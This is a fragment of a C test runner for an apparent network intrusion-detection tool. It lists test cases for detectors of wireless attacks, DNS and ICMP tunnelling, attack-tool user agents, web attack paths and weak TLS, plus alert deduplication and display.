    RUN_TEST(test_ssid_confusion_mfp_drop_fires);
    RUN_TEST(test_ssid_confusion_enterprise_akm_downgrade_fires);
    RUN_TEST(test_ssid_confusion_enterprise_both_8021x_no_fire);
    RUN_TEST(test_ssid_confusion_different_ssid_no_fire);
    RUN_TEST(test_ssid_confusion_open_weak_side_defers_to_twin);
    RUN_TEST(test_mgmt_fuzz_crit_at_five);
    RUN_TEST(test_mgmt_fuzz_warn_at_three);
    RUN_TEST(test_mgmt_fuzz_clean_no_fire);
    RUN_TEST(test_mgmt_fuzz_below_warn_no_fire);
    RUN_TEST(test_rogue_radius_weak_method_crit);
    RUN_TEST(test_rogue_radius_identity_leak_warn);
    RUN_TEST(test_rogue_radius_clean_no_fire);
    RUN_TEST(test_dns_tunnel_fires_on_long_subdomain_burst);
    RUN_TEST(test_dns_tunnel_normal_traffic_no_fire);
    RUN_TEST(test_dns_tunnel_few_long_no_fire);
    RUN_TEST(test_icmp_tunnel_fires);
    RUN_TEST(test_icmp_tunnel_small_pings_no_fire);
    RUN_TEST(test_icmp_tunnel_single_large_ping_no_fire);
    RUN_TEST(test_icmp_tunnel_spread_across_pairs_no_fire);
    RUN_TEST(test_icmp_tunnel_v6_fires);
    RUN_TEST(test_icmp_tunnel_detail_keeps_full_v6_addrs);
    RUN_TEST(test_probe_flood_fires_on_high_rate);
    RUN_TEST(test_probe_flood_low_total_no_fire);
    RUN_TEST(test_probe_flood_exactly_at_frame_threshold_fires);
    RUN_TEST(test_probe_flood_one_below_frame_threshold_no_fire);
    RUN_TEST(test_probe_flood_detail_contains_mac);
    RUN_TEST(test_probe_flood_too_brief_no_fire);
    RUN_TEST(test_attack_tool_ua_sqlmap_fires);
    RUN_TEST(test_attack_tool_ua_nmap_case_insensitive);
    RUN_TEST(test_attack_tool_ua_normal_browser_no_fire);
    RUN_TEST(test_attack_path_traversal_fires);
    RUN_TEST(test_attack_path_sqli_fires);
    RUN_TEST(test_attack_path_log4shell_fires);
    RUN_TEST(test_attack_path_xss_fires);
    RUN_TEST(test_attack_path_normal_no_fire);
    RUN_TEST(test_weak_tls_tls10_fires);
    RUN_TEST(test_weak_tls_sslv3_fires);
    RUN_TEST(test_weak_tls_tls13_no_fire);
    RUN_TEST(test_weak_tls_tls12_no_fire);
    RUN_TEST(test_no_monitor_mode_fires_when_no_monitor_iface);
    RUN_TEST(test_no_monitor_mode_no_fire_when_monitor_present);
    RUN_TEST(test_no_monitor_mode_no_fire_when_no_ifaces_yet);

    TEST_SUITE("MITRE ATT&CK technique tagging");
    RUN_TEST(test_attack_technique_populated_on_fire);
    RUN_TEST(test_attack_technique_shape_valid);
    RUN_TEST(test_attack_technique_posture_alert_is_empty);
    RUN_TEST(test_attack_technique_lookup_covers_all_alert_types);

    TEST_SUITE("alerts dedup");
    RUN_TEST(test_dedup_increments_count);
    RUN_TEST(test_distinct_keys_create_distinct_alerts);

    TEST_SUITE("alerts snapshot");
    RUN_TEST(test_snapshot_newest_first);

    TEST_SUITE("view_alerts");
    RUN_TEST(test_view_draw_empty);
    RUN_TEST(test_view_draw_populated);
    RUN_TEST(test_view_key_nav);
    RUN_TEST(test_view_key_clear);
}
